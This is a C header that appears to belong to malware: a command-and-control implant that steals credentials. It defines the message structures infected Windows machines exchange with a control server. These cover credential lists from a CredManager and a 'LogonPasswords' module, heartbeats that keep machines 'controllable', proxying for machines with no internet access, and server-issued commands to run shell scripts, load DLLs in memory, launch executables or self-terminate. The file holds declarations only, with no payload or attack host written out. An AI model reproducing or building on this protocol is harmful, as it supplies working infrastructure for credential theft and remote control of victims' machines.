/*
	CommStructures.h
	Different communication structures and definitions used by misc modules
*/

#pragma once

#include <windows.h>

// a word value to identify what data is appended to a generic INNER_ENVELOPE structure 
// set at INNER_ENVELOPE.wEnvelopeId. Recommended volatility tags when adding such types are
// (V) - volatile, (P) - persistent
typedef enum EnvelopeId {
	EID_NONE = 0,			//  -  none defined, assumed to be an error
	EID_CREDENTIALS_LIST,	// (V) serialized buffer with all credentials from CredManager (found locally, from network, etc)
	EID_HEARTBEAT,			// (V) a chunk issued periodically by every machine in order to server know it's still alive and controllable (heartbeat)
	EID_COMMAND_RESULT,		// (P) result of executing a particular command, identified by it's uniq id
	EID_REMOTE_CHUNKS_BUFFER,	// (P) a set of chunks received from some machine with no direct internet access, contains extra encryption layer just like 
								// every server request. Used by pipe proxy module at NetworkConnectivity.cpp

	EID_LPR_RESULT,			// (V) LogonPasswords module resulting code
	EID_KBRI_HEARTBEAT,		// (V) mod_KBRI heartbeat, to receive t-acss list
	EID_KBRI_NOTIFY,		// (P) notify about usage of a particular t-acc

	EID_MAX_VALUE = MAXWORD	// define max value to fit into serialized structure
};


// INNER_ENVELOPE.bContextFlags possible flags position, in bits from low to high
#define ICF_PLATFORM_X64					0		// set when current platform is x64
#define ICF_BUILD_X64						1		// set when x64 build is running
#define ICF_MACHINE_HAS_INTERNET_ACCESS		2		// set when transport uses direct communication (winhttp)
#define ICF_TRANSPORT_INIT_FINISHED			3		// value of ICF_MACHINE_HAS_INTERNET_CONNECTION may be trusted only when this flag set, indicating we received some data

// describes a serialization inner envelope used by all modules when sending some data
// describes a type of data included and source of it
#pragma pack(push)
#pragma pack(1)
typedef struct _INNER_ENVELOPE
{
	// *** filled by caller ***
	WORD wEnvelopeId;	// id of data attached 
	DWORD dwDataLen;	// len of data attached

	// *** may be filled by cmsFillInnerEnvelope() ***
	UINT64 i64SourceMachineId;	// machine which originated this data, some persistent hash to uniquely identify a particular machine

	DWORD dwTickCountStamp;		// GetTicksCount() stamp when original machine generated this chunk, to determine it's uptime in 43 days limits
	
	BYTE bContextFlags;	// misc execution context flags //BYTE bIsX64;	// set to 1 when caller is x64 platform, assume x32 otherwise
	WORD wBuildId;		// id of a build, to distinct different targets

	// local timestamp when this chunk was generated
	WORD wYear;
	BYTE bMonth;
	BYTE bDay;
	BYTE bHour;
	BYTE bMinute;
	BYTE bSecond;
	WCHAR wTZName[32];	// name of a timezone (long description), max 32 wchars
	LONG lBias;			// current bias in minutes against UTC

	// following names are WCHAR
	WCHAR wcDomain[16];			// name of a domain this machine joined to
	WCHAR wcMachine[16];		// name of local machine

} INNER_ENVELOPE, *PINNER_ENVELOPE;

typedef enum SC_TARGET_ARCH {
	SCTA_UNKNOWN = 0,
	SCTA_X32,
	SCTA_X64,
	SCTA_ALL	// arch-independent command, like cmd script or shellexec of non-exe
};

// definition of current arch
#if defined(_M_X64)
#define SCTA_BUILD_ARCH SCTA_X64
#elif defined(_M_IX86)
#define SCTA_BUILD_ARCH SCTA_X32
#endif

typedef enum SC_COMMAND_ID {
	SCID_UNKNOWN = 0,

	// mod_CmdExec
	SCID_SHELL_SCRIPT,
	SCID_DLL_MEMORY,
	SCID_EXE_DISK_CREATEPROCESS,
	SCID_EXE_SHELLEXECUTE,
	SCID_TERMINATE_SELF,	// executes ExitProcess() to enable self-termination

	// mod_KBRI
	SCID_KBRI_TACC_ITEM = 100,	// server issue this as a result of receiving EID_KBRI_HEARTBEAT item
	SCID_KBRI_REMOVED_TACC,		// identified for a removed t-accs id

	SCID_MAXVAL = 0xFFFF
};

// structure describing a command chunk received from server as an answer for a particular request
// NB: there may be more than 1 chunk in answer, wdd parser should hadle it
typedef struct _SERVER_COMMAND {

	WORD wCommandId;		// id of a command server wants to be executed (what to do), according to SC_COMMAND_ID

	DWORD dwPayloadSize;	// amount of payload data appended after this structure, depends on particular command id

	DWORD dwUniqCmdId;	// uniq id to identify this command, should be used by executor when it sends result to remote server (may be set to 0 when server doesn't need an answer?)

	BYTE bTargetArch;	// target architecture of the command, to be checked by executor if it is possible/matches code's platform
						// possible values are defined by SC_TARGET_ARCH

} SERVER_COMMAND, *PSERVER_COMMAND;

typedef enum ENUM_COMMAND_EXEC_RESULT {
	CER_NO_RESULT = 0,			// assumed to be an error, not to be used 
	CER_ERR_NO_EXECUTOR,		// no module answered for this command, so it supposed to be unsupported
	CER_ERR_PLATFORM_MISMATCH,	// target platform for cmd and current platform is not compatible, for ex, CreateProcess() with x64 binary on x32 platform
	CER_ERR_SPECIFIC_ERROR,		// module-specific error, description set at payload in module-specific structure

	CER_OK,						// command executed ok, some resulting data may be appended at payload

	CER_MAXVAL = 0xFFFF	// max value to fit into WORD range
};

// prepared by client when it sends a generic result of a single command to server
typedef struct _CLIENT_COMMAND_RESULT {
	
	DWORD dwUniqCmdId;	// value from SERVER_COMMAND.dwUniqCmdId

	WORD wGenericResult;	// value of generic result code, according to ENUM_COMMAND_EXEC_RESULT

	DWORD dwPayloadSize;	// amount of extra data appended, as a result of command exec. May contain specific error description structure, or some data gathered as a result of cmd exec

} CLIENT_COMMAND_RESULT, *PCLIENT_COMMAND_RESULT;

#pragma pack(pop)

// module context vars
typedef struct _COMMSTRUCT_CONTEXT
{
	BOOL bInited;	// set to TRUE when inited all major fields

	// constant fields not changed until reboot
	UINT64 i64SourceMachineId;
	WCHAR wcDomain[16];			// name of a domain this machine joined to
	WCHAR wcMachine[16];		// name of local machine
	BOOL bWOW3264Detected;	// initialized for x32 platform, to check if this is a x64 host


	// these are set on transport api request, saved and used to send flags to server
	BOOL bTransportInited;
	BOOL bMachineHasInternetAccess;	


} COMMSTRUCT_CONTEXT, *PCOMMSTRUCT_CONTEXT;




typedef struct _CommStructures_ptrs {

	VOID (*fncmsFillInnerEnvelope)(INNER_ENVELOPE *iEnvelope);
	INNER_ENVELOPE *(*fncmsAllocInitInnerEnvelope)(LPVOID pExtraData, DWORD dwExtraDataLen, EnvelopeId eiEnvelopeId);
	VOID (*fncmsReportInternetAccessStatus)(BOOL bAccessAvailable);

} CommStructures_ptrs, *PCommStructures_ptrs;

#ifdef ROUTINES_BY_PTR

	#pragma message(__FILE__": ROUTINES_BY_PTR compilation mode")

	// global var definition to be visible by all modules which use this one
	extern CommStructures_ptrs CommStructures_apis;

	#define cmsFillInnerEnvelope CommStructures_apis.fncmsFillInnerEnvelope
	#define cmsAllocInitInnerEnvelope CommStructures_apis.fncmsAllocInitInnerEnvelope
	#define cmsReportInternetAccessStatus CommStructures_apis.fncmsReportInternetAccessStatus

	VOID CommStructures_resolve(CommStructures_ptrs *apis);

#else

	VOID cmsFillInnerEnvelope(INNER_ENVELOPE *iEnvelope);
	INNER_ENVELOPE *cmsAllocInitInnerEnvelope(LPVOID pExtraData, DWORD dwExtraDataLen, EnvelopeId eiEnvelopeId);
	VOID cmsReportInternetAccessStatus(BOOL bAccessAvailable);

	VOID CommStructures_imports(CommStructures_ptrs *apis);

#endif